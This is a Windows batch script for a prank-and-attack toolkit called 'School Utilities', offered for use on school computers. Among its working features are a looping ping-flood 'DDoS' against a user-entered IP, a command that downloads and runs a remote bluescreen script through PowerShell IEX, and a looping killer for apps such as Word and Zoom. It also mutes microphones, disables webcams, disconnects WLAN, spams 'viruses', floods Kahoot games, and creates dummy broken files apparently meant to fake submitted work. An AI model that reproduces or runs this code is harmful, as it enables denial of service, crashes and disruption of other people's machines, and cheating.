@Echo off
@setlocal enableextensions
@cd /d "%~dp0"


if exist admin goto ADMINSTART
if exist admin1 goto ADMINSTART
goto check_Permissions


:ADMINSTART
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

:check_Permissions
set admin_status=0
net session >nul 2>&1
if %errorLevel% == 0 (
    set admin_status=1
) else (
    echo Failure: Current permissions inadequate.
)

if exist admin1 del admin1

:current-version
set current-version=1.0
if %errorlevel%==9009 exit
echo 1
cls
cls
Title School Utilities
CLS
if exist skip goto skip
if exist skip1 goto skip
cls

:skip
if exist skip del skip /f /q
Set "Path=%Path%;%cd%;%cd%\files"
Mode 80,25

SETLOCAL
FOR /F "usebackq" %%f IN (`PowerShell -NoProfile -Command "Write-Host([Environment]::GetFolderPath('Desktop'))"`) DO (
  SET "DESKTOP_FOLDER=%%f"
  )

cd %~dp0\files
start update-checker.vbs
cls



:Main
title School Utilities
cd %~dp0
if exist camera del camera /f /q&&goto camera
Cls
echo.
echo.Version: 1.0 Release
Echo.
CmdMenuSel 0AA0 "Process killer" "Bluescreen" "Broken file creator" "Mic muter" "Camera" "Fake update" "Kahoot flooder" "Virus spammer" "WLAN disconnecter" "DDoS" "Command line utilities" "About" "Exit"
If /i "%Errorlevel%" == "13" (exit)
If /i "%Errorlevel%" == "12" (goto about)
If /i "%Errorlevel%" == "11" (goto clu)
If /i "%Errorlevel%" == "10" (goto newddos)
If /i "%Errorlevel%" == "9" (goto 5&&set Errorlevel=0)
If /i "%Errorlevel%" == "8" (goto virusspammer&&set Errorlevel=0)
If /i "%Errorlevel%" == "7" (goto kahoot_flooder&&set Errorlevel=0)
If /i "%Errorlevel%" == "6" (goto fakeupdate&&set Errorlevel=0)
If /i "%Errorlevel%" == "5" (goto camera&&set Errorlevel=0)
If /i "%Errorlevel%" == "4" (goto mic&&set Errorlevel=0)
If /i "%Errorlevel%" == "3" (goto bfc)
If /i "%Errorlevel%" == "2" (goto 4)
If /i "%Errorlevel%" == "1" (goto newprocesskiller&&set Errorlevel=0)
If /i "%Errorlevel%" == "9009" (goto err9009)
Cls
Echo. Error %Errorlevel%
Echo.
Echo.
timeout /t 2 >nul
Goto :Main
Pause
exit

:about
cls
title About School Utilities
cd %~dp0/files
Cls
echo.
echo.Version: 1.0
echo.by xcuzimfna
Echo.
CmdMenuSel 0AA0 "Github" "Discord" "Open-source licenses" "Back"
If /i "%Errorlevel%" == "1" (start https://github.com/xcuzimfna/school-utilities)
If /i "%Errorlevel%" == "2" (start https://discord.gg/jYYZcD3Dab)
If /i "%Errorlevel%" == "3" (start LICENSES.school-utilities.html)
If /i "%Errorlevel%" == "4" (goto main)
cls
goto about


:err9009
cls
echo Error
cd C:\Users\%username%\AppData\Local\Temp\
(
    echo msgbox"important data is missing please reinstall" ,16, "School Utilities"
)>err.vbs
timeout -t 1 -nobreak >t
start err.vbs
timeout -t 5 -nobreak >t
start https://github.com/xcuzimfna/school-utilities/releases
exit

:processkill
taskkill /im %process% /f
goto processkill


:newddos
cd %~dp0/files
if exist ddos goto startddos
nircmd.exe qboxtop "This tool is for educational purpose only, usage of School Utilities for attacking targets without prior mutual consent is illegal. Developers assume no liability and are not responsible for any misuse or damage cause by this program. do you want to continue?" "School Utilities" ddos_activate.cmd
goto main
:startddos


:----------
mode CON: cols=89 LINES=22
title DDoS - School Utilities

set "DIR=C:\Users\%username%\AppData\Local\Temp\DDoS"

if exist %DIR% goto skipmd
md %DIR%

:skipmd
cd %DIR%
goto init

:start
set "o= "
DEL /F /Q /S *.bat *.dat
color a
@echo off
cls

call :color 0 " "
call :color 2f "Type"
call :color a " "Menu"  "
call :color f "---- "
call :color a "Goto School Utilities Menu     "    
echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "List"  "
call :color f "---- "
call :color a "To See The Recent IP's You've Entered" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Skype" "
call :color f "---- "
call :color a "To Get Someone's IP With Skype                               "
call :color cf "[Website]" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Server "
call :color f " ---- "
call :color a "To Get A Website's IP" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Track" "
call :color f "---- "
call :color a "To Track Someone's IP                                        "
call :color cf "[Website]" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Help" "
call :color f " ---- "
call :color a "For Help Page                                        " & echo.
echo.
set /p ip= Choice / IP to target:
if %ip%==Skype goto get
if %ip%==skype goto get
if %ip%==SKYPE goto get
if %ip%==Track goto track
if %ip%==track goto track
if %ip%==TRACK goto track
if %ip%==Server goto server
if %ip%==server goto server
if %ip%==SERVER goto server
if %ip%==LIST goto list
if %ip%==list goto list
if %ip%==List goto list
if %ip%==MENU goto home
if %ip%==menu goto home
if %ip%==Menu goto home
if %ip%==HELP goto help
if %ip%==help goto help
if %ip%==Help goto help

call :color e "                                    Validating IP.." & echo.
ping %ip% -l 32 -t -n 1 >> %DIR%\text.dat -n 1
>nul find "Please check the name and try again." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip2
)
:validip2
>nul find "Destination host unreachable." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip3
)
:validip3
>nul find "Request timed out." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip4
)
:validip4
>nul find "PING: transmit failed. General failure." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip
)

:validip
echo.       >> %DIR%\history.log
echo  %date%             IP: %ip%   >> %DIR%\history.log
call :color f "                                   "
call :color a0 " - IP is Valid - " & echo.
call :color 0 " "
call :color 2f "Package:"
call :color 0a " 32 - 15000                                               "
call :color 2f "The Bigger The Better"
call :color 0a "                                                                                             "
call :color 9f "F) Detect Package"
call :color a "                                                               E) Back" & echo.
echo.
set /p package= Package: 
if %package%==f goto find
if %package%==F goto find
if %package%==e goto start
if %package%==E goto start
if %package%==%package% goto pack

:pack
echo exit >> %DIR%\info.bat
echo title DDoS Assistance     >> %DIR%\DDoS-Assistance.bat
echo ping %ip% -t -l %package% >>%DIR%\DDoS-Assistance.bat
set "launch=1"

:ddoslauncher
start /min %DIR%\DDoS-Assistance.bat
set /a launch=%launch% + 1
if %launch%==10 goto lmao
goto ddoslauncher


:server
color f
cls
echo.
echo.
set /p trace=url: 
if %trace%==e goto start
if "%trace%"=="%trace%" goto trace

:trace
color a
tracert %trace%
echo.
echo    -- IP Over This Text --
echo     Copy It If You Want It
echo.
pause
goto start


:help
echo.
call :color a " " 
call :color cf "[+]" 
call :color a " How To Target An Ip" & echo.
call :color b "                     Enter The Ip You Want To DDoS In The Area" & echo.
echo                               "Choice / IP to target:" 
echo.
call :color a " Press "
call :color e "Enter"
call :color a " To Return
set /p nul=
goto start


:home
goto main

:get
start http://mostwantedhf.info
goto start

:track
start http://www.ip-tracker.org/
goto start

:lmao
cls
echo.
ping %IP% -t -l %package% 
exit


:list
cls
if exist %DIR%\history.log type %DIR%\history.log
echo.
echo.
echo  C)Clear                  E)Back
echo.
echo.
set /p ip=
if %ip%==c goto clear
if %ip%==e goto start
:clear
del %DIR%\history.log
goto start


:find
cls
set /a package=11000
echo title Package Detector     >> %DIR%\Package-Detector.bat
echo :beginning                 >> %DIR%\Package-Detector.bat
echo if exist %DIR%\info.bat call %DIR%\info.bat >> %DIR%\Package-Detector.bat
echo goto beginning             >> %DIR%\Package-Detector.bat
set "launch=1"


:launcher
start /min %DIR%\Package-Detector.bat
set /a launch=%launch% + 1
if %launch%==12 goto resetfind
goto launcher


:resetfind
if exist %DIR%\info.bat del %DIR%\info.bat
set /a package=%package% - 1000
if %package%==0 goto invalidip
echo.
echo  Testing Package: %package%
echo ping %ip% -l %package% -t -n 1 >> %DIR%\info.bat
if exist %DIR%\text.dat del %DIR%\text.dat
ping %ip% -l %package% -t -n 2 >> %DIR%\text.dat -n 2
>nul find "Request timed out." %DIR%\text.dat && (
  goto resetfind
) || (
  goto pack
)


:invalidip
call :color c "                                 - IP Does Not Exist -" & echo.
ping localhost -n 2 >NUL
goto start

:init
setlocal EnableDelayedExpansion
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set "DEL=%%a"
)
<nul> X set /p ".=."
goto start

:-----------------



:fakeupdate
cls
cd %~dp0/files
title Fake Update - School Utilities
Cls
echo.
echo.Warning: You cannot cancel the update once you have started the update!
Echo.
CmdMenuSel 0AA0 "Start Update (Duration 75sec)" "Open GUI" "Back"
If /i "%Errorlevel%" == "1" (fakeupdater.exe --d=3 --c="taskkill /im fakeupdater.exe&&taskkill /im cmd.exe")
If /i "%Errorlevel%" == "2" (start fakeupdater.exe)
If /i "%Errorlevel%" == "3" (goto main)
cls
goto fakeupdate


:kahoot_flooder
cls
title Kahoot Flooder - School Utilities
cd %~dp0/files/kahoot_flooder
if exist installed goto run_kahoot_flooder
cd %~dp0/files
title Kahoot Flooder - School Utilities
Cls
echo.
echo.This tool was made for educational and demonstrational purposes.
Echo.
CmdMenuSel 0AA0 "1. Install Node.js (required)" "2. Install Kahoot Flooder" "3. Run Kahoot Flooder" "Back"
If /i "%Errorlevel%" == "1" (start https://nodejs.org/dist/v16.13.1/node-v16.13.1-x64.msi)
If /i "%Errorlevel%" == "2" (goto install_kahoot_flooder)
If /i "%Errorlevel%" == "3" (goto run_kahoot_flooder)
If /i "%Errorlevel%" == "4" (goto main)
cls
goto kahoot_flooder

:install_kahoot_flooder
cd %~dp0/files/kahoot_flooder
start npm i
goto kahoot_flooder

:run_kahoot_flooder
title Kahoot Flooder - School Utilities
cd %~dp0/files/kahoot_flooder
node flood.js
goto kahoot_flooder

:restart
cd %~dp0
echo 1>skip
start "" "%~f0"
exit

:admin_restart
cd %~dp0
echo 1>admin1
start "" "%~f0"
exit



:3

cd %DESKTOP_FOLDER%
md "GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}"
cd %~dp0/files
nircmd.exe infoboFx "your file has been created successfully!" "School Utilities" 
goto restart
exit

:clu
cls
cd %~dp0/files
title Command line utilities - School Utilities
Cls
echo.
Echo.Command line utilities
Echo.
CmdMenuSel 0AA0 "Broken File Creator (bfc)" "Process Killer (pk)" "Back"
If /i "%Errorlevel%" == "1" (goto bfcc)
If /i "%Errorlevel%" == "2" (goto pk)
If /i "%Errorlevel%" == "3" (goto main)
cls
goto clu


:bfcc
cls
cd %~dp0/files
Cls
echo.
Echo.Broken File Creator
Echo.
CmdMenuSel 0AA0 "Install" "Uninstall" "Back"
If /i "%Errorlevel%" == "1" (goto bfc-install)
If /i "%Errorlevel%" == "2" (goto bfc-uninstall)
If /i "%Errorlevel%" == "3" (goto clu)
cls
goto bfcc


:bfc-install
cd %~dp0/files/bfc
start powershell -command "&{start-process bfc_install.bat -verb RunAs}"
goto bfcc

:bfc-uninstall
cd %~dp0/files/bfc
start powershell -command "&{start-process bfc_uninstall.bat -verb RunAs}"
goto bfcc

:pk
cls
cd %~dp0/files
Cls
echo.
Echo.Process Killer
Echo.
CmdMenuSel 0AA0 "Install" "Uninstall" "Back"
If /i "%Errorlevel%" == "1" (goto pk-install)
If /i "%Errorlevel%" == "2" (goto pk-uninstall)
If /i "%Errorlevel%" == "3" (goto clu)
cls
goto pk


:pk-install
cd %~dp0/files/pk
start powershell -command "&{start-process pk_install.bat -verb RunAs}"
goto pk

:pk-uninstall
cd %~dp0/files/pk
start powershell -command "&{start-process pk_uninstall.bat -verb RunAs}"
goto pk


:newprocesskiller
title Process Killer - School Utilities
cls
Echo.
Echo Please select a process
Echo.
CmdMenuSel 0AA0 "onenote.exe" "winword.exe" "firefox.exe" "powerpnt.exe" "chrome.exe" "Zoom.exe" "RingCentralMeetings.exe" "Other Process" "Back"
If /i "%Errorlevel%" == "9" (goto main)
If /i "%Errorlevel%" == "8" (goto oprocess)
If /i "%Errorlevel%" == "7" (set process=RingCentralMeetings.exe)
If /i "%Errorlevel%" == "6" (set process=Zoom.exe)
If /i "%Errorlevel%" == "5" (set process=chrome.exe)
If /i "%Errorlevel%" == "4" (set process=powerpnt.exe)
If /i "%Errorlevel%" == "3" (set process=firefox.exe)
If /i "%Errorlevel%" == "2" (set process=winword.exe)
If /i "%Errorlevel%" == "1" (set process=onenote.exe)
Cls
title Process Killer - School Utilities - WORKING (KILLING %process%)
goto processkilln

:processkilln
cd C:\Users\%username%\AppData\Local\Temp\
set rn2=%random%.cmd
echo @echo off >>%rn2%
echo title Process Killer - School Utilities - Running - (KILLING %process%) >>%rn2%
echo :pc2 >>%rn2%
echo cls >>%rn2%
echo taskkill /im %process% /f >>%rn2%
echo goto pc2 >>%rn2%
start /min %rn2%
goto main

:oprocess
cls
tasklist
echo.
echo Please insert a valid process
set /p process=
goto processkilln


:4
cd %~dp0/files
start /min bsod_a.cmd
echo. please wait...
cls
goto main
exit


:camera
cls
cd %~dp0/files
set camera_status=Unknown
set Errorlevel=
if %admin_status% == 1 (
    goto camera1
) else (
    cd %~dp0
    echo camera>camera
    goto admin_restart
    exit
)
:camera1
title Camera - School Utilities
Cls
powershell Get-PnpDevice -FriendlyName *webcam*
echo.
Echo.Camera state: %camera_status%
Echo.
CmdMenuSel 0AA0 "Disable Camera" "Enable Camera" "Back"
If /i "%Errorlevel%" == "1" (goto disable_camera)
If /i "%Errorlevel%" == "2" (goto enable_camera)
If /i "%Errorlevel%" == "3" (goto main)
goto camera1

:disable_camera
powershell Disable-PnpDevice -InstanceId (Get-PnpDevice -FriendlyName *camera*  -Status OK).InstanceId -Confirm:$false
powershell Disable-PnpDevice -InstanceId (Get-PnpDevice -FriendlyName *webcam*  -Status OK).InstanceId -Confirm:$false
set camera_status=Disabled
goto camera1


:enable_camera
powershell Enable-PnpDevice -InstanceId (Get-PnpDevice -FriendlyName *camera*  -Status Error).InstanceId -Confirm:$false
powershell Enable-PnpDevice -InstanceId (Get-PnpDevice -FriendlyName *webcam*  -Status Error).InstanceId -Confirm:$false
set camera_status=Enabled
goto camera1

:5
cd %~dp0/files
start /min net_disconnect
goto main


:mic
set muter=Unknown
cd %~dp0/files
:muter
set Errorlevel=
title Mic Muter - School Utilities

Cls
Echo.
Echo.Microphone state: %muter%
Echo.
CmdMenuSel 0AA0 "Mute" "Unmute" "Back"
If /i "%Errorlevel%" == "1" (goto mute)
If /i "%Errorlevel%" == "2" (goto unmute)
If /i "%Errorlevel%" == "3" (goto main)
goto muter

:mute
cls
SoundVolumeView.exe /Mute "DefaultCaptureDevice" 
set muter=muted
goto muter

:unmute
cls
SoundVolumeView.exe /unMute "DefaultCaptureDevice"
set muter=unmuted
goto muter





:bluescreen.cmd
echo powershell -Command "IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD">bluescreen.cmd
echo MsgBox "Bluescreen.cmd installed", VBOKOnly, "School Utilities">msb.vbs
timeout -t 2 -nobreak
start msb.vbs
timeout -t 2 -nobreak
del msb.vbs
goto gt


:bfc
SETLOCAL
FOR /F "usebackq" %%f IN (`PowerShell -NoProfile -Command "Write-Host([Environment]::GetFolderPath('Desktop'))"`) DO (
  SET "DESKTOP_FOLDER=%%f"
  )
cd %DESKTOP_FOLDER%
cd %~dp0/files
title Broken File Creator - School Utilities
Cls
echo.
Echo.Please select a file size:
Echo.
CmdMenuSel 0AA0 "Small - (Small PDF; Word File) [390-550KB]" "Medium - (Big PDF; 2min MP3 AUDIO) [1-3MB]" "Big - (5min MP4 VIDEO; ) [40-60MB]" "Custom Size" "Back"
If /i "%Errorlevel%" == "1" (goto small)
If /i "%Errorlevel%" == "2" (goto Medium)
If /i "%Errorlevel%" == "3" (goto Big)
If /i "%Errorlevel%" == "4" (goto bfc_custom_size)
If /i "%Errorlevel%" == "5" (goto main)



:Small
 SET PSScript=%Temp%\~tmpRandom4Digit.ps1
 IF EXIST "%PSScript%" DEL /Q /F "%PSScript%"

 ECHO $fRandom = Get-Random -Maximum 550000 -Minimum 390000>>"%PSScript%"
 ECHO $Random  = "{0:0000}" -f $fRandom>>"%PSScript%"
 ECHO ECHO $Random>>"%PSScript%"

 SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0 
 CD /D "%PowerShellDir%" 
 FOR /F "DELIMS=" %%A IN ('Powershell -ExecutionPolicy Bypass -Command "& '%PSScript%'"') DO SET "bfc-size=%%A"
 goto bfc_name
:Medium
 SET PSScript=%Temp%\~tmpRandom4Digit.ps1
 IF EXIST "%PSScript%" DEL /Q /F "%PSScript%"

 ECHO $fRandom = Get-Random -Maximum 3000000 -Minimum 1000000>>"%PSScript%"
 ECHO $Random  = "{0:0000}" -f $fRandom>>"%PSScript%"
 ECHO ECHO $Random>>"%PSScript%"

 SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0 
 CD /D "%PowerShellDir%" 
 FOR /F "DELIMS=" %%A IN ('Powershell -ExecutionPolicy Bypass -Command "& '%PSScript%'"') DO SET "bfc-size=%%A"
 goto bfc_name
:Big
 SET PSScript=%Temp%\~tmpRandom4Digit.ps1
 IF EXIST "%PSScript%" DEL /Q /F "%PSScript%"

 ECHO $fRandom = Get-Random -Maximum 60000000 -Minimum 40000000>>"%PSScript%"
 ECHO $Random  = "{0:0000}" -f $fRandom>>"%PSScript%"
 ECHO ECHO $Random>>"%PSScript%"

 SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0 
 CD /D "%PowerShellDir%" 
 FOR /F "DELIMS=" %%A IN ('Powershell -ExecutionPolicy Bypass -Command "& '%PSScript%'"') DO SET "bfc-size=%%A"
 goto bfc_name




:bfc_name
cls
echo File Name (with extension):
set /p bfc_name=
if %bfc_name%==menu goto menu
if %bfc_name%==exit exit
goto bfc_creator

:bfc_creator
fsutil file createnew %DESKTOP_FOLDER%\%bfc_name% %bfc-size%
nircmd.exe infobox "Your file has been created! File path: %desktop_folder%" "School Utilities"
goto bfc

:bfc_custom_size
cls
echo.
echo Custom File Size (in bytes):
set /p bfc-size=
goto bfc_name


:virusspammer
cd %~dp0/files
start /min vs.cmd
goto restart

:color
set "param=^%~2" !
set "param=!param:"=\"!"
findstr /p /A:%1 "." "!param!\..\X" nul
<nul set /p ".=%DEL%%DEL%%DEL%%DEL%%DEL%%DEL%%DEL%"

